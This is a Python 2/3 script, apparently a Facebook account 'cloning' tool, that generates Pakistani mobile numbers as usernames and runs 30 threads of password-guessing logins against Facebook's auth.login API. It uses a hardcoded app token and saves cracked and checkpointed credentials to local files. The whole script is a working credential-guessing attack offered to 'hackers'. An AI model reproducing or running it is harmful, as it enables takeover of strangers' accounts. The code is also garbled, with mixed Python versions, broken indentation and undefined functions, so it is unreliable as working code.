logo="""                  ▇◤▔▔▔▔▔▔▔◥▇
                  ▇▏◥▇◣┊◢▇◤▕▇
                  ▇▏▃▆▅▎▅▆▃▕▇
                  ▇▏╱▔▕▎▔▔╲▕▇
                  ▇◣◣▃▅▎▅▃◢◢▇
                  ▇▇◣◥▅▅▅◤◢▇▇
                  ▇▇▇◣╲▇╱◢▇▇▇ 
//////////////////Haroon khan//////////////////"""

print(logo)
name=input("What is your name? ")
print("Wellcome2_hackers_worlds"+name)


    print '\x1b[1;0m--------------------------------------------------'
    print '\x1b[1;92m[1] \x1b[1;32mCLONING MENU'
    print '\x1b[1;0m--------------------------------------------------'
    action()


def action():
    bch = raw_input('\x1b[1;97m SELECT :-  \x1b[1;91m')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print '    \x1b[1;96mEnter any Pakistan Mobile code Number' + '\n'
        print '\x1b[1;33m--------------------------------------------------'
        print '\x1b[1;92m [00,01,02,03,04,05,06,07,08,09]'
        print '\x1b[1;91m [11,12,13,14,15,16,17,18]'
        print '\x1b[1;92m [21,22,23,24]'
        print '\x1b[1;91m [30,31,32,33,34,35,36]'
        print '\x1b[1;92m [40,41,42,43,44,45,46,47,48,49]'
        print '\x1b[1;33m--------------------------------------------------'
        
        try:
            c = raw_input('\x1b[1;97mSELECT :-  \x1b[1;91m')
            os.system('clear')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    print logo
    print ' \x1b[1;96m      CODE YOU CHOOSE \x1b[1;97m: ' + c
    print 50 * '\x1b[1;93m-'
    xxx = str(len(id))
    print '\x1b[1;97m[!]\x1b[1;92m Total Pakistan ids:\x1b[1;93m ' + c
    print '\x1b[1;97m[!]\x1b[0;96m Wait A While Start\x1b[1;92m Cracking...'
    print '\x1b[1;97m[!]\x1b[0;34m To Stop Process Press\x1b[1;97m Ctrl+z'
    print 50 * '\x1b[1;93m-'
    print '\x1b[1;97m      IF IDS NOT COMING TURN ON AIRPLANE FOR 7 SEC AND TURN OFF AGAIN'
    print 50 * '\x1b[1;93m-'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('save')
        except OSError:
            pass

        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92m Ahsan_ok \x1b[1;97m]\x1b[1;92m ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass1
                okb = open('Results/successfull.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;91m Ahsan_cp \x1b[1;97m]\x1b[1;90m ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass1
                cps = open('Results/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92m Ahsan_ok \x1b[1;97m]\x1b[1;92m ' + k + c + user + '\x1b[1;97m | \x1b[1;92m' + pass2
                    okb = open('Results/successfull.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;91m Ahsan_cp \x1b[1;97m]\x1b[1;90m ' + k + c + user + '\x1b[1;97m | \x1b[1;90m' + pass2
                    cps = open('Results/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : Results/cloned.txt'
    jalan('Note : Your Offline account Will Open after 4 to 5 days')
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()

if __name__ == '__main__':
    login()
